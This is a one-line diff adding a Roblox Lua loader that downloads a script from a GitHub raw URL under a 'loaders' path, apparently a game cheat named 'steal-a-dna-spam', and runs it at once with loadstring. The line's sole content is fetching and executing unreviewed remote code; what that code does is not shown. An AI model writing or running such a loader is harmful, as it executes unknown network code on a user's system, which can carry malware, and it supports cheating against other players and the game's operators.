@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/steal-a-dna-spam3-6b9oubi5o957cw.lua"))()
